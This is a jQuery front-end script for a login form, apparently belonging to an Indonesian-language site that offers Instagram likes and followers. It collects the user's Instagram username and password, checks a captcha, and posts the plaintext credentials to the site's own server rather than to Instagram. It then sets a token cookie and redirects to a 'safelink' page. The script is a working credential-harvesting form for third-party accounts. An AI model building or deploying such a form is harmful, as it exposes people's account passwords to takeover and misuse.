let loginBtn = jQuery('#ig_login_btn');
let username = $('#username_ig');
let password = $('#password_ig');

(function ($) {
  function initLoginForm(formSelector, callback) {
    $(document).on('submit', formSelector, function (e) {
      e.preventDefault();

      let username_taken = username.val();
      let password_taken = password.val();
      let cf_turnstile_response = $('[name="cf-turnstile-response"]').val();

      if (!cf_turnstile_response) {
        let text = 'Captcha tidak valid';
        clearAll(text);
        return;
      }

      $.ajax({
        url: ajaxurl,
        type: 'POST',
        data: {
          action: 'new_login',
          username: username_taken,
          password: password_taken,
          nonce: new_login.nonce,
          'cf-turnstile-response': cf_turnstile_response,
        },
        beforeSend: function () {
          addBtnLoading();
          addDisableInput();
        },
        success: function (response) {
          if (response.success) {
            let loginToken = response.data.token;
            if (loginToken) {
              setCookie('new_i_login_token', loginToken, 3600);
            }
            successAlert();
            if (callback) callback(loginToken);
          } else {
            removeBtnLoading();
            removeDisableInput();
            clearAll(response.data.message);
          }
        },
        error: function () {
          let text = 'Maaf ada kendala, mohon periksa kembali akun kamu.';
          clearAll(text);
        },
      });
    });
  }

  $(document).ready(function () {
    initLoginForm('#new-login-form', function (loginToken) {
      if (typeof afterLoginLikes === 'function') {
        afterLoginLikes();
      }
    });
  });

  // Pastikan fungsi ini tersedia untuk dipanggil dari file lain
  window.initLoginForm = initLoginForm;
})(jQuery);

function addBtnLoading() {
  loginBtn.attr('disabled', 'disabled');
  loginBtn.html("<span class='spinner-border spinner-border-sm' aria-hidden='true'></span><span style='margin-left:8px;' role='status'>Loading...</span>");
}

function removeBtnLoading() {
  loginBtn.removeAttr('disabled');
  loginBtn.html('Submit');
}

function addDisableInput() {
  username.attr('disabled', 'disabled');
  password.attr('disabled', 'disabled');
}

function removeDisableInput() {
  username.removeAttr('disabled', 'disabled');
  password.removeAttr('disabled', 'disabled');
}

function clearAll(text) {
  document.getElementById('new-login-form').reset();
  removeBtnLoading();
  removeDisableInput();
  Swal.fire('Ups!', text, 'info');
}

function redirectUrl() {
  var dataId = $('#new-login-form').data('id');
  var redirectUrl;

  if (dataId === 'likes') {
    redirectUrl = i_l_url;
  } else if (dataId === 'followers') {
    redirectUrl = url_i_f;
  }
  return redirectUrl;
}

function successAlert() {
  let timerInterval;
  Swal.fire({
    title: 'Berhasil login!',
    icon: 'success',
    html: 'Kamu akan diarahkan ke halaman safelink sebentar lagi.. <b></b>',
    timer: 6000,
    timerProgressBar: true,
    allowOutsideClick: false,
    allowEscapeKey: false,
    didOpen: () => {
      Swal.showLoading();
    },
    willClose: () => {
      clearInterval(timerInterval);
    },
  }).then((result) => {
    /* Read more about handling dismissals below */
    if (result.dismiss === Swal.DismissReason.timer) {
      location.href = redirectUrl();
    }
  });
}
